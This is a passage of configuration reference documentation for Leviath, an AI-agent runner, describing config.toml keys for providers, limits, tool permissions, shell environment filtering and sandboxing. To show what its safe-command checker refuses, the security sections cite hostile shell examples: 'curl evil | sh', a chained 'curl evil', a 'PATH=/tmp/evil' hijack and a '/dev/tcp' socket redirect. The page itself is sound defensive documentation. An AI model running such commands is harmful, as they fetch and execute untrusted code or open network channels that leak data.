---
title: Configuration
description: Every config.toml key with its type and default, the env vars that fill them when the file is empty, and the published JSON schema.
group: Reference
group_order: 3
order: 1
---

# Configuration (`config.toml`)

Machine-wide settings live in `~/.leviath/config.toml`. [`lev setup`](/docs/cli) writes it for you,
and everything below is optional: an install with one provider key works with no other key set.

This page is the exhaustive list. The concept pages explain *why* each knob exists; this one is
where you look up the exact name, type, and default. The same contract ships machine-readable as a
[JSON schema](https://leviath.dev/docs/stable/config.schema.json) with a commented
[example file](https://leviath.dev/docs/stable/config.example.toml).

> [!NOTE]
> The daemon watches this file and reloads it when it changes, so an edit takes effect on the
> **next** `lev run` with no restart. `lev serve` reads it per request, so an edit - through
> `PUT /api/config` or from anywhere else - is on the next page load. Boot-time wiring (native
> provider keys, MCP connections, telemetry exporters) still needs `lev daemon restart`. See
> [the daemon docs](/docs/daemon#config-changes-take-effect-on-the-next-run).

## Top level

```toml
default_provider     = "anthropic"   # provider used when a blueprint names none
default_model        = "claude-sonnet-4-5"   # bare model id on default_provider, no "anthropic/" prefix
agent_paths          = ["~/projects/my-agents"]   # extra directories scanned for blueprints
openrouter_api_key   = "sk-or-..."   # env fallback: OPENROUTER_API_KEY
ollama_base_url      = "http://localhost:11434"   # env fallback: OLLAMA_HOST
request_timeout_secs = 900           # per-request HTTP timeout to a provider
taint_tracking       = false         # global master switch, see below
batch_tool_hint      = true          # global master switch, see below
shell_hint           = true          # global master switch, see below
update_check         = true          # ask whether a newer release exists
```

| Key | Type | Default | Notes |
|---|---|---|---|
| `default_provider` | string | `"anthropic"` | |
| `default_model` | string | unset | A bare model id on `default_provider`, not `provider/model`. A leading `<default_provider>/` is dropped and named at load, so `"ollama/qwen3.8:latest"` under `default_provider = "ollama"` still works. See [which entry a stage starts on](/docs/providers#which-entry-a-stage-starts-on) |
| `agent_paths` | array of paths | `[]` | Searched in addition to `~/.leviath/agents` |
| `openrouter_api_key` | string | unset | Falls back to `OPENROUTER_API_KEY` |
| `ollama_base_url` | string | unset | Falls back to `OLLAMA_HOST`, then `http://localhost:11434` |
| `request_timeout_secs` | integer | unset | Unset means the 15 minute ceiling. A stage's `[stages.<name>.model] request_timeout_secs` wins for that stage |
| `taint_tracking` | bool | `false` | Turns on [taint tracking](/docs/security) for every agent. With it off, an agent can still opt in itself |
| `batch_tool_hint` | bool | `true` | Adds a short hint telling the model it may batch independent tool calls |
| `shell_hint` | bool | `true` | Adds a short hint describing the shell a stage will get. Only says anything on Windows today |
| `update_check` | bool | `true` | Lets this copy ask whether a newer release exists on its own channel, at most once an hour. Set `false` on an air-gapped machine, or anywhere an outbound request nobody asked for is the problem. Off, `lev update` still says how to update and [`GET /api/update`](/docs/api#asking-how-to-upgrade) still answers; both report `null` for whether anything newer exists |

All three of those cascade: a stage setting beats an agent setting, which beats this file.

### System-prompt hints

`batch_tool_hint` and `shell_hint` are the two hints Leviath writes into a stage's system prompt on
its own. Both are on by default, both cascade stage over agent over this file, and both sit at the
front of the cacheable prefix so they cost nothing after the first call:

```toml
# config.toml: off for this machine
shell_hint = false
```

```toml
# a blueprint: back on for this one agent, off for one stage of it
[agent]
shell_hint = true

[stages.plan]
shell_hint = false
```

`shell_hint` only reaches a stage that advertises the `shell` tool, and only on a platform whose
shell needs explaining. On Linux and macOS it is inert whatever you set it to. See
[Built-in tools](/docs/tools#which-shell-you-get) for what it says on Windows.

## `[providers]`

Provider credentials. Every key falls back to the matching environment variable, so you can leave
the file empty in CI.

```toml
[providers]
anthropic_api_key   = "sk-ant-..."   # env fallback: ANTHROPIC_API_KEY
openai_api_key      = "sk-..."       # env fallback: OPENAI_API_KEY
google_api_key      = "..."          # env fallback: GOOGLE_API_KEY
anthropic_base_url  = "https://gw.corp/v1"   # env fallback: ANTHROPIC_BASE_URL
openai_base_url     = "https://gw.corp/v1"   # env fallback: OPENAI_BASE_URL
google_base_url     = "https://gw.corp/v1"   # env fallback: GOOGLE_BASE_URL
openrouter_base_url = "https://gw.corp/v1"   # env fallback: OPENROUTER_BASE_URL
claude_code_enabled = false          # opt in to the Claude Code CLI transport
claude_code_binary  = "/usr/local/bin/claude"   # unset resolves `claude` on PATH
claude_code_effort  = "medium"       # low | medium | high | xhigh | max
anthropic_cache_ttl = "5m"           # 5m (default) | 1h
fallback_order      = ["anthropic/claude-sonnet-5", "openai/gpt-5.6-mini"]
```

`anthropic_cache_ttl` is how long a cached prompt prefix survives. The default `5m` is free; `1h`
costs more to write and sends the beta header it needs. It is worth the write cost for a staged
agent. Stages routinely take longer than five minutes, especially when one is running scripts. A
prefix cached at the start of a run is then cold by the time a later stage could have reused it.

### Reaching a provider through a gateway

`<provider>_base_url` points one provider at a different host: an enterprise gateway, or a
self-hosted proxy that speaks the same API on another origin. Unset means the vendor's own
endpoint, which is what a config that says nothing has always meant.

One setting per provider rather than one for all of them, because a gateway usually fronts one
family. Setting `anthropic_base_url` alone sends Anthropic traffic through the gateway and leaves
OpenAI going straight out, which is the arrangement most of these deployments actually have.

Each falls back to an environment variable, so a machine behind a gateway needs no config file at
all - the gateway is a property of the host rather than of the checkout.

A gateway serving model IDs the vendor never published (`internal-model-1`, say) also needs those
IDs described, or nothing knows their context window. That is
`[model_capabilities.<model_id>]` below, which works the same way for a gateway as for anything
else.

`HTTP_PROXY` and `HTTPS_PROXY` are honoured independently of this, so a gateway that is itself
behind a proxy needs nothing extra here.

`claude_code_enabled` is off unless you turn it on. See
[Providers](/docs/providers#claude-code-transport) for the terms note that goes with it.

`fallback_order` is where a run goes when the provider it is using stops being usable: out of
credits, or a rejected key. Entries are `provider/model` pairs, best first, tried after the stage's
own model list and your default model. One naming a provider you have not configured is skipped.
It is read per run, so a change takes effect on the next `lev run` with no restart. See
[Providers](/docs/providers#a-host-wide-fallback-chain).

## `[limits]`

```toml
[limits]
max_concurrent_inferences = 8    # in-flight requests per model without its own pool entry
max_concurrent_tools      = 8    # agents whose tool batches may run at once, daemon-wide
default_max_iterations    = 50   # fallback cap for a stage that sets none
stream_inference          = true # ask a model that can stream to stream
script_shell_timeout_secs = 60
mcp_idle_disconnect_secs  = 60   # disconnect an MCP server no agent has used for this long
stall_timeout_secs        = 60   # fail a run that can never dispatch
dead_cycles_before_relief = 10   # widen the tool lane after this long going nowhere
finished_retention_secs   = 300  # keep a finished run in `lev ps` this long
wedge_timeout_secs        = 0    # fail a run nothing can reach any more; 0 is off
provider_failures_before_open  = 3     # pull a provider after this many failures in a row
provider_circuit_cooldown_secs = 300   # how long before it is tried again
interaction_timeout_secs  = 3600 # release a prompt nobody answered
inference_retry_attempts  = 4    # tries per inference, the first one included
inference_retry_base_ms   = 1000 # first retry wait for an ordinary blip; it doubles
max_tool_call_write_bytes = 2147483648   # 2 GiB; delete the line for no limit
max_run_write_bytes       = 10737418240  # 10 GiB; delete the line for no limit

[limits.max_concurrent_inferences_by_model]
"gpt-oss-120b" = 2               # this model's pool; others use the number above

[limits.max_concurrent_inferences_by_provider]
cerebras = 1                     # every model this provider serves, together
```

| Key | Default | Notes |
|---|---|---|
| `max_concurrent_inferences` | `8` | The [inference pool](/docs/engine#inference-pools) cap, per model |
| `max_concurrent_tools` | `8` | Size of the shared tool worker pool. Clamped to at least 1 |
| `default_max_iterations` | `50` | A stage's own `max_iterations` always wins |
| `stream_inference` | `true` | Ask a model that can stream to stream. See below |
| `script_shell_timeout_secs` | `60` | Cap on a Rhai script tool's `shell()` host call |
| `mcp_idle_disconnect_secs` | `60` | Disconnect an [MCP server](/docs/mcp) no agent has used for this long. It reconnects on next use |
| `stall_timeout_secs` | `60` | Fail a run that can never dispatch. See below |
| `dead_cycles_before_relief` | `10` | 30-second cycles with a full [tool lane](/docs/engine#the-tool-lane) and nothing moving before the lane widens. `0` never widens it |
| `finished_retention_secs` | `300` | How long a finished run stays in [`lev ps`](/docs/cli#runs-that-have-finished). See below |
| `wedge_timeout_secs` | `0` (off) | Fail a run nothing can reach any more. See below |
| `provider_failures_before_open` | `3` | Failures in a row before a provider is pulled. See below |
| `provider_circuit_cooldown_secs` | `300` | How long a pulled provider waits before one request tests it. A success restores it, a failure restarts the wait |
| `interaction_timeout_secs` | `3600` | How long a prompt may go unanswered. See below |
| `inference_retry_attempts` | `4` | Tries per inference, the first included. See below |
| `inference_retry_base_ms` | `1000` | First retry wait for an ordinary blip, doubling each retry. See below |
| `max_tool_call_write_bytes` | unset | Most one tool call may write. See below |
| `max_run_write_bytes` | unset | Most a whole run may write. See below |
| `max_concurrent_inferences_by_model` | empty | Per-model overrides of the cap above. See below |
| `max_concurrent_inferences_by_provider` | empty | Per-provider caps across every model a provider serves. See below |
| `notify_spend_usd` | empty | Dollar figures to be told about while a run is still going. See below |
| `max_agents_per_run` | `0` | Most agents one run may create, sub-agents included. `0` is no ceiling. See below |

Eleven of those need more than a table cell.

**`stream_inference`** asks a model that can stream to stream. It changes nothing an agent sees:
the chunks are folded back into one finished turn before anything reads it, because half a sentence
is not something a run can act on. What it changes is the connection. A buffered call sends nothing
back until the model has finished thinking, so a long turn is a socket that has been silent for
minutes, and a NAT, a VPN or a corporate proxy takes a silent socket for a dead one and closes it -
failing a request that was going perfectly well. Set it to `false` if a provider's stream
misbehaves; a provider that does not offer streaming for the model in hand is called the old way
regardless.

**`max_agents_per_run`** is what makes a run's cost predictable:

```toml
[limits]
max_agents_per_run = 20
```

A run's price is very nearly its headcount. Measured across four finished research
runs, cost per agent stayed between $5.37 and $9.05 while the count ranged from 10
to 42, so the bill followed the headcount and nothing bounded the headcount:
`max_child_depth` bounds how deep the sub-agent tree goes, and a fan-out stage's
`max_items` bounds a single split, but the total was whatever each generation of
workers thought was worth spawning.

A run that reaches the ceiling stops widening. It is not failed and its workers are
not cancelled: the ones already running finish, the merge happens on what came back,
and the run writes its report on that. Stopping early is a cheaper answer, not a
broken one.

Counted per run from its root, so a worker deep in the tree cannot spend the whole
budget on its own branch.

[Managing your costs](/docs/costs) puts this beside the other levers, with the measurements each
one came from.

**`notify_spend_usd`** says which figures are worth interrupting you for:

```toml
[limits]
notify_spend_usd = [5, 25, 100]
```

Each is reported once per run, the first time that run's total passes it, over the event stream and
in the dashboard. The event carries the running total and the stage that was running when it
crossed, which is the stage doing the spending; the full per-stage breakdown is in the run's
`stages.json`.

This is reporting, not a ceiling. It does not stop a run, because stopping one mid-stage throws away
work and that is a different decision from wanting to know what is happening. To bound the spend
rather than watch it, see `max_agents_per_run` below and
[managing your costs](/docs/costs).

A run whose models have no published price reports what it could price and marks the figure
incomplete, rather than a confident number that is wrong. Completeness is a different question from
whether the priced part came from the provider's own figures or was reconstructed from rate cards;
the run record's `cost_is_exact` answers that one. See [providers](/docs/providers) for where
prices come from and when they are a reconstruction rather than the invoice.

**`max_concurrent_inferences_by_model`** and **`max_concurrent_inferences_by_provider`** are the
two ways to say "not this one". The first replaces the global cap for one model id. The second adds
a *separate*, coarser pool in front of it, bounding every model one provider serves together - a
request needs a slot in both, and holds both until it finishes:

```toml
[limits]
max_concurrent_inferences = 8

[limits.max_concurrent_inferences_by_provider]
cerebras = 1
```

That is one request at a time to `cerebras`, whatever it is serving, while every other provider
keeps the eight. A provider not named here has no pool of its own; the global number is a per-model
one and is not applied per provider as well. See
[inference pools](/docs/engine#inference-pools), and note that this bounds *concurrency* while
[`[rate_limits.<provider>]`](#rate_limitsprovider) bounds *rate*.

`0` is not a way to say "no limit" in any of the three, and not a way to disable a provider either:
a pool of nothing would park every request on it for the life of the daemon, and waiting for a full
pool is ordinary backpressure that is never failed or reported. A `0` is therefore read as `1` and
said so in the log. To lift a limit, delete the key.

**`stall_timeout_secs`** only fires for something the runtime cannot resolve on its own. Today that
means a stage whose provider is not configured: the run is ready to work and has nowhere to send the
request. Waiting for a busy model's pool is ordinary backpressure and is never failed, however long
it takes. `0` waits forever.

**`finished_retention_secs`** keeps a run visible after it ends, so a script polling on an interval
can see *how* it ended rather than finding it gone. `0` drops it immediately. The record is held in
memory, so a daemon restart clears it whatever you set.

**`wedge_timeout_secs`** fails a run that is sitting in a state no part of the engine can reach,
rather than leaving it reported as running. A slow run never trips it: an agent waiting on the
model, a tool, its sub-agents, or a person is exempt however long it takes. It is off
by default because it fails runs, and that should be your decision. `300` is sensible if something
outside Leviath is tracking your slots. See [External work queues](/docs/work-queues).

**`provider_failures_before_open`** counts failures only you can fix, such as an exhausted account
or a rejected key, before that provider is taken out of service for every run. Three rather than one,
because a single payment error can just be one oversized request. `0` disables it and leaves per-run
failover to cope alone.

A provider that answered the connection and then went quiet gets four times that budget, so the
default pulls it after twelve rather than three. The two failures do not mean the same thing:
nothing listening on the port is a fact about the provider, and the next request fails identically,
while a timeout is usually a fact about one request - a large prompt against a busy server. Three
slow calls in a row is an ordinary afternoon on a big run, and pulling a working provider there
takes it away from every other run for the whole cooldown. Twelve rather than never, because a
provider that accepts connections and answers nothing is still one no run should be sent to. The
same knob sets both, so `0` still disables the whole thing.

**`inference_retry_attempts`** and **`inference_retry_base_ms`** set how hard a failed model call
is retried before the agent is failed and its finished work is thrown away. Only a *transient*
failure is retried at all: a reset connection, a timeout, a 429, a 5xx. A rejected key or an
over-long request fails on the first answer, because the second would be the same.

There are three schedules, and only the blip one is configurable. An ordinary blip waits
`inference_retry_base_ms` and doubles, so the default four attempts are 1s, 2s, 4s. A **capacity**
refusal - a 429, or Anthropic's 529 "overloaded" - waits 15s, 30s, then 60s per further attempt
instead, because an overload window lasts minutes and a second of waiting only buys another refusal.
A call that **reached the provider** and then went quiet - a timeout, or an answer that stopped
part-way - starts at 5s and doubles, so the same four attempts cover about thirty-five seconds:
that failure usually means the network moved underneath the run, and a wifi handover or a VPN
reconnecting outlasts seven seconds every time. A name that does not resolve or a port that refuses
keeps the fast schedule, since that answer is instant and identical however long you wait. When the
provider sends a `Retry-After`, that answer wins over all of them, capped at a minute.

Raising `inference_retry_attempts` is therefore how a run rides out a longer outage: `6` gives a
capacity failure about four minutes of waiting rather than about one and a half. Whatever you set,
the retries of a single request sleep **at most five minutes in total**, and the request itself is
still bounded by its stage's `request_timeout_secs`, so a run can never wait indefinitely.

**`interaction_timeout_secs`** puts a deadline on any prompt that waits on a person: `ask_user_*`,
tool approvals, taint gates, and interaction points. When it expires the daemon resolves the prompt
and lets the run continue. An expiry *denies* an approval and tells the model no answer came. It
never counts as consent. `0` waits indefinitely. See
[when nobody answers](/docs/interaction#when-nobody-answers).

<a id="security"></a>

**`max_tool_call_write_bytes`** and **`max_run_write_bytes`** bound how much an agent puts on disk.
Both are **unset in code and written by `lev setup`**, which is the unusual part and is deliberate.
How much an agent should be allowed to write depends on what you are doing with it, so Leviath
imposes nothing on a config it did not write. A fresh install gets concrete numbers here, where you
can see them and **delete the line to remove the limit**.

The incident behind them was a single shell call appending in a loop until the 60-second timeout.
That put about 14 GB on disk from one call that looked ordinary, and it repeated until the disk was
full.

They work differently because they have to. `write_file` and `edit_file` carry their content as an
argument, so an oversized one is refused before a byte lands. A shell redirect does not: those bytes
go from the shell to the file without passing through Leviath, so the target is measured *after* the
call. That stops the call after the one that overran, not the one that did.

Running out of disk is separate and **not configurable**. Leviath refuses any write that would leave
under a gigabyte free, whatever these two say and whatever `--yolo` says, because filling the disk
harms every other process on the machine rather than just the run. A filesystem whose free space
cannot be read is treated as unknown and allowed, because a guard that cannot measure has nothing to
say. The two ceilings above still apply to it.

## `[security]`

Machine-wide switches that are not part of the per-tool permission cascade.

```toml
[security]
allowed_workdirs           = []   # workdir roots lev run accepts without a confirm prompt
allow_seed_commands        = true
allow_local_network        = false
allow_env_vars             = ["MY_PROVIDER_KEY"]
allow_blueprint_read_paths = false
allow_blueprint_safe_commands = false
allow_blueprint_permissions   = false
shell_env                  = "filtered"   # filtered | strict | custom | inherit
shell_env_withhold         = []          # names withheld under shell_env = "custom"
read_paths                 = ["~/.leviath/runs", "glob:~/design-docs/**"]
credential_store           = "file"   # file | keychain
```

| Key | Default | Notes |
|---|---|---|
| `allowed_workdirs` | `[]` | Directories a run's workdir may sit under without being confirmed. See below |
| `allow_seed_commands` | `true` | Whether a blueprint's `seed = { command = "..." }` regions may run at all. See below |
| `allow_local_network` | `false` | Whether agent fetches may reach loopback, private, and link-local addresses. See below |
| `allow_env_vars` | `[]` | Credential-shaped variable names a Rhai script may read through `env_var()`. Exact and case-insensitive, no wildcards |
| `allow_blueprint_read_paths` | `false` | Honors every blueprint's `[read_paths]` as written. Prefer a per-agent grant for anything you did not author |
| `allow_blueprint_safe_commands` | `false` | Honors every blueprint's `[safe_commands]` as written. Off, an installed agent cannot pre-approve its own shell |
| `allow_blueprint_permissions` | `false` | Honors every blueprint's `[tool_permissions]`, even above the built-in default. See below |
| `shell_env` | `"filtered"` | Which of the daemon's environment variables a shell command inherits. See below |
| `shell_env_withhold` | `[]` | The names `shell_env = "custom"` withholds. Ignored under every other mode |
| `read_paths` | `[]` | Machine-wide read grants, which apply only where a blueprint declares the path too. See below |
| `credential_store` | `"file"` | `keychain` moves secrets to the OS credential store. Run `lev auth migrate` after changing it |

Five of those need more than a table cell.

**`allowed_workdirs`** silences the confirm prompt for everything under a listed path. Left empty,
`lev run` asks only about the alarming cases: a home directory, or a filesystem root.

**`allow_seed_commands`** covers commands that run at spawn, before the first approval prompt.
Because there is nobody to ask at that moment, a seed command also has to be covered by
`[safe_commands]`. `--no-seed-commands` refuses seed commands for one run.

**`allow_local_network`** is off by default. Off, an agent's fetches cannot reach cloud metadata
endpoints, your own `lev serve`, or anything else on your LAN.

**`allow_blueprint_permissions`** off still lets a blueprint pre-approve `web_search` and
`web_fetch`. Anything else is clamped to the built-in default. To grant one tool to one agent
instead, name it under `[agent_tool_permissions.<agent>]`.

**`read_paths`** opens nothing on its own. A grant applies only to a path the blueprint also
declares, so both halves have to name it.

Grant entries (here and in `[agent_read_paths]`) take three forms: an exact path, which grants its
subtree; `glob:` patterns; and `regex:` patterns, auto-anchored. Both patterns are matched against
the symlink-resolved real path and are written with `/` on every OS. `~/` expands to your home, and
a relative entry resolves against the run's workdir. Full walkthrough in
[Security](/docs/security#reading-outside-the-workdir).

## `[serve]`

What `lev serve` takes on at once and how long it gives each request. Every key has a default,
so the whole section can be omitted; the `lev serve` flags of the same name win over it, and `0`
switches a limit off. See [Limits](/docs/api#limits) for what a client sees.

```toml
[serve]
max_concurrent_requests = 64   # in flight at once; the next is answered 503
request_timeout_secs    = 30   # per request; over it the client gets 408
```

The websocket routes are outside both limits. Neither is a ceiling on the runs behind the API:
a spawn the daemon takes a minute to accept still spawns.

## `[agent_read_paths.<agent>]`

Per-agent read grants, the itemized counterpart of `allow_blueprint_read_paths`.

```toml
[agent_read_paths.cto]
allow = ["~/.leviath/runs", "glob:~/design-docs/**"]
```

An agent's declarations mean nothing until one of these grants lands, so `lev validate <agent>`
checks each declared entry against this file and prints the block above, filled in, for whatever it
does not find. `lev list` and `lev ps` carry the same counts.

## Tool permissions

`[tool_permissions]` sets a machine-wide ceiling. A blueprint's own `[tool_permissions]` may
tighten it but never loosen it. For a tool you have not listed here there is no ceiling to clamp
against, so a blueprint may raise it no higher than the built-in default. The exceptions are
`web_search` and `web_fetch`, which read-only research agents pre-approve. To go further, name the
tool under `[agent_tool_permissions.<agent>]`, or set `[security] allow_blueprint_permissions`.

```toml
[tool_permissions]
shell      = "ask"     # allow | ask | deny
write_file = "ask"
read_file  = "allow"
```

`[agent_tool_permissions.<agent>]` is the escape hatch. Naming an agent replaces the global value
for it, and that becomes the ceiling its blueprint is clamped against.

```toml
[agent_tool_permissions.coder]
shell = "allow"
```

Resolution order, narrowest first: launch flag, stage, agent, this file, built-in default. A launch
flag (`--allow`, `--yolo`) can turn `ask` into `allow` but can never lift a `deny`. The built-in
defaults are in [Built-in tools](/docs/tools).

### What a shell command inherits

The daemon holds provider keys, `LEVIATH_API_TOKEN`, and whatever the person who started it had
exported. Handing all of that to every shell command means one `env` in tool output leaks the lot.
`shell_env` decides how much a `shell` tool call, a Rhai `shell()`, and a region's command seed
inherit. All three answer to the same setting, so a script with `shell` is not a way around the
`env_var` gate.

| Mode | What it withholds |
|---|---|
| `filtered` (default) | Credential-shaped names, **except `SSH_AUTH_SOCK`**, so `git push` over agent keys still works |
| `strict` | The same, plus `SSH_AUTH_SOCK`, `AWS_PROFILE`, `AWS_REGION`, `KUBECONFIG`, `NETRC`. See below |
| `custom` | Exactly the names in `shell_env_withhold`, and nothing inferred |
| `inherit` | Nothing |

`strict` breaks `git push`, `aws` and `kubectl` inside a shell tool until you list the names those
commands need. Toolchain variables pass through under every mode: `PATH`, `HOME`, `CARGO_HOME`,
`JAVA_HOME`, `VIRTUAL_ENV`, `NVM_DIR`, `GOPATH`, `DOCKER_HOST`, `TERM`. `allow_env_vars` hands a
specific name over under every mode too, so one list means one thing whichever surface asks.

```toml
[security]
shell_env          = "custom"
shell_env_withhold = ["MY_INTERNAL_TOKEN", "LEGACY_CRED"]
allow_env_vars     = ["MY_PROVIDER_KEY"]
```

Be clear about what this buys. With `cat` and `grep` on the default safe list, a granted shell can
read `~/.leviath/config.toml` and find the provider key anyway. This is defence in depth against
accidental leakage: an `env` in tool output, a `printenv` in a log, a subprocess that phones home.
It also closes the command-seed case, where nothing was ever approved. It is not a boundary. For
one, use `[sandbox]`.

## `[safe_commands]` and `[agent_safe_commands.<agent>]`

A permission is per tool name, which for the shell is a choice between a prompt on every `ls` and no
prompt on `curl evil | sh`. These entries are argument-scoped, and can only turn an `ask` into an
`allow`. They never lift a configured `deny`.

```toml
[safe_commands]
defaults = true                 # ship the read-only verb list
tools    = ["read_files"]
shell    = ["cargo test", "rg"]

[agent_safe_commands.coder]
shell           = ["./gradlew", "env:GRADLE_OPTS"]
allow_blueprint = true          # honour this agent's own [safe_commands]
```

| Key | Default | Notes |
|---|---|---|
| `defaults` | `true` | The shipped read-only verb list. See below |
| `tools` | `[]` | Tools that never prompt whatever their arguments. Built-in names, or MCP names as advertised (`server__tool`) |
| `shell` | `[]` | A program, optionally with the subcommand that narrows it. `git status`, never `git` or `cargo test --lib`. Also `env:NAME`, below |
| `allow_blueprint` | `false` | Per-agent only. Honour that agent's own `[safe_commands]` block |

An entry on the `defaults` list has to clear one bar: under any flag, it must not be able to write a
file, run another program, or open a connection. That is why `find`, `sed`, `awk`, `sort`, `xargs`,
`env` and `cargo` are absent from it. It is also why `uniq` (it writes its second operand), `tree`
(`-o`) and `rg` (`--pre` runs a command) were taken off. Add any of them back by name if you want
them unprompted.

A shell entry covers the program it names with any arguments, so `cat` covers `cat notes.md`. It
does not cover a line that also runs something else: `cat notes.md && curl evil` still asks, because
`curl` is in neither the safe list nor any grant. `lev approvals safe` prints what is in effect and
which file put it there.

### Environment assignments

A command line decides more than which program runs. `PATH=/tmp/evil ls` runs `ls` from a directory
of the caller's choosing, and `export PATH=/tmp/evil; ls` does the same a segment earlier, so naming
the program alone would let the safe list approve somebody else's binary. Each variable a line binds
is therefore its own key, spelled `env:NAME`:

```toml
[safe_commands]
shell = ["env:RUST_LOG", "env:CARGO_TERM_COLOR"]
```

`RUST_LOG=debug cargo test` then needs `cargo test` and `env:RUST_LOG`, and granting one variable
grants exactly that one. There is no entry that covers every variable at once, and no program name
widens onto an `env:` key.

Two constructs are refused rather than keyed, because they install code to run at a point no program
name in the line describes: `trap`, and defining or aliasing a name with `function`, `alias` or
`unalias`. A line containing one of those prompts every time and cannot be pre-approved. `set -euo
pipefail` is unaffected, since shell options change nothing about which program a name resolves to.

### Redirects

`echo x > file` writes a file, and no tool name in the call says so. A shell call that redirects
output is therefore held to the `write_file` policy as well as the shell's own. Where `write_file`
is `deny` the call is refused, and it is never quieter than a `write_file` call would have been.
That is what stops a redirect being a spelling of `write_file` that a `deny` never sees.

Each target is also its own key, so an approval names what is being written:

```
Allow cat notes.md, >/tmp/report.txt for this run
```

A write cannot be pre-approved in a config file the way a program can. `[safe_commands] shell`
rejects any entry beginning with `>`. A write is approved by a person, per target, or not at all.

Three shapes cost nothing, because they write nothing that outlives the call. The first is the
throwaway devices: `/dev/null`, `/dev/stdout`, `/dev/stderr`, `/dev/tty` and `/dev/fd/*`. The second
is a descriptor duplication such as `2>&1`. The third is a read redirect, since a program that can
read a file could already read it. So `cargo build > /dev/null 2>&1` and `cat notes.md 2>/dev/null`
are as quiet as they were.

Two shapes cannot be granted at all. A target that only exists after expansion (`> $OUT`) names a
different file on every run. Bash's `> /dev/tcp/host/port` is a socket rather than a file, which
makes the redirect a network channel no program name describes. Both prompt every time.

<a id="tool_script_permissions"></a>

## `[tool_script_permissions]`

Layer 3 of the permission model: what a Rhai script tool may *do*, independent of whether the tool
is visible or approved. Each key is `allow`, `deny`, or `inherit`.

```toml
[tool_script_permissions]
http_get   = "inherit"
http_post  = "inherit"
shell      = "inherit"
read_file  = "inherit"
write_file = "inherit"
env_var    = "inherit"
```

Every field defaults to `inherit`. For `shell`, `read_file`, and `write_file`, that defers to the
agent's own permission for the equivalent built-in and permits the call only when it resolves to
`allow`. For `http_get`, `http_post`, and `env_var`, which have no built-in equivalent, `inherit`
permits the call; the tool itself is still gated by the other three layers. See
[Rhai tools](/docs/rhai-tools).

## `[sandbox]`

The machine-wide default sandbox for tool execution. An agent's or stage's own `[sandbox]`
overrides it, and the two resolve to the **stronger** of the pair, so an installed agent can tighten
its sandbox but never turn one off.

```toml
[sandbox]
kind           = "container"   # none | namespace | container
image          = "debian:bookworm-slim"
engine         = "docker"      # docker | podman | nerdctl | finch; auto-detected when unset
network        = true
mounts         = ["/opt/toolchain:ro"]
persist        = false
on_unavailable = "error"       # error | warn
```

Unset entirely, agents run tools on the host. The boundary covers shell commands only: the
`shell` tool, seed commands and a Rhai tool's `shell()`. File tools, and a Rhai tool's HTTP and
file calls, run on the host whatever this says, held to the workdir by path confinement rather than
by the sandbox. Details in [Security and sandboxing](/docs/security#sandboxes).

## `[rate_limits.<provider>]`

Client-side limits enforced before every call, for the built-in providers (`anthropic`, `openai`,
`google`, `openrouter`).

```toml
[rate_limits.anthropic]
requests_per_minute = 50
tokens_per_minute   = 40000
```

Both are enforced before every call. `requests_per_minute` counts calls made in
the last minute; `tokens_per_minute` counts the tokens those calls reported
back, so it lags the request window by one call and errs on the provider's
side. When either window is full the call waits for the oldest entry to leave
it. A `0` on either key means no limit on that side: `requests_per_minute = 0`
leaves only the token window in force, and `tokens_per_minute = 0` only the
request window.

This shapes request *rate*. `[limits] max_concurrent_inferences` and
`[limits.max_concurrent_inferences_by_provider]` bound *concurrency*. Both apply. Script providers
configure their rate limit under `[model_providers.<name>.rate_limit]` instead; their concurrency
cap goes in `[limits.max_concurrent_inferences_by_provider]` with everyone else's.

## Keys nothing reads

A key Leviath does not recognize is named at start-up rather than ignored, wherever it sits:

```
WARN config.toml has keys nothing reads; they are being ignored.
     keys=limits.max_concurrent_tool, cache, providers.anthropic_cach_ttl
```

`lev doctor` reports the same list, for when that scrolls past. It also names a
`[rate_limits.<provider>]` entry whose provider does not exist, which is a case the key check cannot
see: that table takes any name, so a misspelled provider deserializes perfectly and throttles
nothing.

This is a warning, not an error. Every command reads `config.toml`, so one stale key should not take
the CLI down. A blueprint is different: it is authored and validated deliberately, and it fails on
an unknown key.

The one place unrecognized keys are *kept*: `[model_providers.<name>]` forwards anything it does not
recognize to the Rhai script, so those are read and never reported.

## `[model_capabilities.<model_id>]`

Per-model corrections to the provider's built-in capability table. Useful for a local or
self-hosted model Leviath does not know, or one whose window it has wrong.

**Name only what you are changing.** Every field is optional and an unnamed one keeps whatever the
provider already reports for that model, so the common case is one line:

```toml
[model_capabilities."moonshotai/kimi-k3"]
max_context_tokens = 1048576
```

A misspelled key is refused at load rather than ignored, so a typo cannot look like a working
override. The full set, when you do want to state all of it:

```toml
[model_capabilities.my-local-llama]
supports_temperature = true
supports_streaming   = true
supports_tools       = true
supports_system_prompt = true
max_context_tokens   = 32768
max_output_tokens    = 4096
```

`lev models show <model>` prints the values a run will actually use, with any correction already
applied, and says whether they came from the provider's own listing or this build's table.
`GET /api/models` carries the same numbers plus a `limits_source` of `api`, `builtin` or
`override`, so a client can tell a figure the provider reported from one this build matched off the
model's name. The two are not worth the same and they look identical once printed.

### Where a model's capabilities come from

Three sources, narrowest first:

1. A `[model_capabilities]` entry, if you wrote one. Your number is the last word, which is how you
   correct an API that is itself wrong. One exception: a model that has refused a temperature is
   never sent another, whatever an entry says, because the request was made and the answer was no.
2. What the provider's own listing reports, read once when the daemon starts, again whenever
   `GET /api/models` or `lev models` asks, and kept for the life of the process. No two listings
   carry the same fields, so each provider reads what its own endpoint has and leaves the rest to
   the table:

   | provider | reads | learns | cannot learn |
   |---|---|---|---|
   | OpenRouter | `/models` | both limits, whether the model takes a temperature and tools (`supported_parameters`), the price per token, whether the upstream bills a cache write (the signal for explicit cache markers), the release date | nothing it lists; a few entries carry no `supported_parameters` |
   | Anthropic | `/v1/models`, every page | `max_input_tokens`, `max_tokens`, the display name, the release date | temperature: the listing has no such field, so the table says which models refuse one |
   | OpenAI | `/v1/models` | the model ids, release and retirement dates | sizes, temperature and tools: the listing describes none of them |
   | Google | `/v1beta/models`, every page | both limits, whether the model samples (`maxTemperature`); models without `generateContent` are dropped | tools, price, dates. Needs the native base URL; an OpenAI-compat one has no such listing |
   | Ollama | `/api/ps`, then `/api/show` | the served window (see below), whether the model calls tools (`capabilities`) | temperature: every local model takes one |

   Once a provider's listing has been read it is also the complete list of what that provider
   serves, so `lev validate` refuses a model it does not carry (Ollama is the exception: `/api/tags`
   is what has been pulled, not what Ollama can serve).

3. The table compiled into this build, matched against the model's name, and for an OpenRouter model
   it does not name, a conservative 128,000 tokens.

Ollama is asked twice because the two endpoints answer different questions. `/api/ps` reports the
window the runner **actually allocated** for a model it currently has loaded, which is the only
figure that is an observation rather than an inference, so it is taken as final. For anything not
